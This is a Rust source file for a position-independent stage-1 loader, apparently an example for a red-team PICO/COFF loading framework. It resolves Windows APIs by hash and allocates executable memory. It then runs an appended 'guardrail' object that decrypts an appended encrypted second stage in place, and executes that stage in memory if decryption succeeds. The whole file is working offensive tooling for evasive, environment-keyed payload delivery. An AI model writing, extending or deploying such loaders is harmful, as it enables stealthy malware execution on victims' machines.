#![no_std]
#![no_main]

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }

use core::{ffi, mem, ptr::{null_mut}, slice::from_raw_parts_mut};
use crystal_sdk::{append_data, get_resource, import, mem::memcpy};
use crystal_bindings::tcg::{PicoCodeSize, PicoDataSize, PicoEntryPoint, PicoLoad, findFunctionByHash, findModuleByHash};
use winapi::{shared::{basetsd::SIZE_T, minwindef::{DWORD, FARPROC, HMODULE, LPVOID}, ntdef::LPCSTR}, um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}};

#[unsafe(no_mangle)]
pub extern "C" fn resolve(mod_hash: u32, func_hash: u32) -> FARPROC {
    unsafe {
        let h_module = findModuleByHash(mod_hash);
        findFunctionByHash(h_module, func_hash)
    }
}

append_data!(coff_gr, findAppendedGR);
append_data!(coff_s2, findAppendedS2);

import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: usize, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
import!(KERNEL32!VirtualFree(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD) -> i32);
import!(LoadLibraryA(arg1: LPCSTR) -> HMODULE);
import!(GetProcAddress(arg1: HMODULE, arg2: LPCSTR) -> FARPROC);

type PicoMainGuardrail = unsafe extern "C" fn(buf: *const u8, len: i32, out_len: *mut i32) -> *const u8;

#[allow(non_snake_case, non_camel_case_types)]
#[repr(C)]
struct Win32Funcs {
    pub LoadLibraryA: LoadLibraryAFn,
    pub GetProcAddress: GetProcAddressFn,
    pub VirtualAlloc: VirtualAllocFn,
    pub VirtualFree: VirtualFreeFn,
}

fn guardrail_decrypt(funcs: &Win32Funcs, buf: &mut [u8]) -> (*const u8, i32) {
    unsafe {
        let dst_code;
        let dst_data;
        let src_pico = findAppendedGR();
        let mut out_len: ffi::c_int = 0;
        let result;

        /* allocate memory for our PICO */
        dst_data = (funcs.VirtualAlloc)(null_mut(), PicoDataSize(src_pico as _) as _, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
        dst_code = (funcs.VirtualAlloc)(null_mut(), PicoCodeSize(src_pico as _) as _, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);

        /* load our pico into our destination address, thanks!
         *
         * Note, that the first parameter (funcs) is also used to map LoadLibraryA and GetProcAddress symbols within the
         * COFF to these pointers we already know. Sometimes, we have follow-on values in this struct pointer passed to
         * PicoLoad. In this case, WIN32FUNCS has VirtualAlloc and VirtualFree too. The .spec file import command lets
         * us give names to these follow-on function values and use them from a COFF loaded with PicoLoad. stage2.spec
         * and stage2.c demonstrates this.
         */
        PicoLoad(funcs as *const _ as _, src_pico as _, dst_code as _, dst_data as _);

        /* execute our pico */
        result = mem::transmute::<_, PicoMainGuardrail>(PicoEntryPoint(src_pico as _, dst_code as _).unwrap_unchecked())(
            buf.as_ptr(), buf.len() as _, &mut out_len
        );
        
        // free memory
        (funcs.VirtualFree)(dst_data, 0, MEM_RELEASE);
        (funcs.VirtualFree)(dst_code, 0, MEM_RELEASE);

        (result, out_len)
    }
}

fn run_stage2(funcs: &Win32Funcs, src_pico: *const u8, free_me_buffer: *const u8) {
    unsafe {
        let dst_code;
        let dst_data;
        let entry;

        /* allocate memory for our PICO */
        dst_data = (funcs.VirtualAlloc)(null_mut(), PicoDataSize(src_pico as _) as _, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
        dst_code = (funcs.VirtualAlloc)(null_mut(), PicoCodeSize(src_pico as _) as _, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);

        /* load our pico into our destination address, thanks! */
        PicoLoad(funcs as *const _ as _, src_pico as _, dst_code as _, dst_data as _);

        /* get our entry point */
        entry = PicoEntryPoint(src_pico as _, dst_code as _).unwrap_unchecked();
            
        /* we can now free the buffer that has our srcPico data in it */
        (funcs.VirtualFree)(free_me_buffer as _, 0, MEM_RELEASE);

        /* And, we can call our pico entry point */
        entry(go as _);
        
        /* We've passed getStart() the start address of this PIC to our stage 2 because we're going to free() this
            stage 1 PIC in this example. But, let's keep these here, in case a future iteration of stage 2 returns on
            an error and we need to gracefully clean-up as much as we can. */
        (funcs.VirtualFree)(dst_data, 0, MEM_RELEASE);
        (funcs.VirtualFree)(dst_code, 0, MEM_RELEASE);
    }
}

#[unsafe(no_mangle)]
extern "C" fn go() {
    unsafe { 
        let stage2;
        let buffer;
        let data;

        /* resolve the functions we'll need */
        let funcs = Win32Funcs { 
            LoadLibraryA: LoadLibraryA_ptr(), 
            GetProcAddress: GetProcAddress_ptr(),
            VirtualAlloc: VirtualAlloc_ptr(), 
            VirtualFree: VirtualFree_ptr(),
        };

        /* find our (encrypted) stage 2 appended to this PIC */
        stage2 = get_resource(findAppendedS2());

        /* Allocate the memory for our decrypted stage 2. We are responsible for free()'ing this.
         * We will free this value in run_stage2() */
        buffer = from_raw_parts_mut((funcs.VirtualAlloc)(null_mut(), stage2.len(), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE) as *mut u8, stage2.len());

        /* copy our (encrypted) stage 2 over to our RW working buffer, our guardrail PICO decrypts in place */
        memcpy(buffer.as_mut_ptr(), stage2.as_ptr(), stage2.len());

        /* run our guardrail COFF to handle *everything* about the guardrail process. Note that the return
         * value of this function is a SLICE into the buffer we passed in. It's not a new allocation. */
        data = guardrail_decrypt(&funcs, buffer).0;

        /*
         * Guardail decryption SUCCESS, run stage 2!
         */
        if !data.is_null() {
            run_stage2(&funcs, data, buffer.as_ptr());
        }
        /*
         * Guadrail decryption FAILED, do something else, or just exit.
         */
        else {
            (funcs.VirtualFree)(buffer.as_ptr() as _, 0, MEM_RELEASE);
        }
    };
}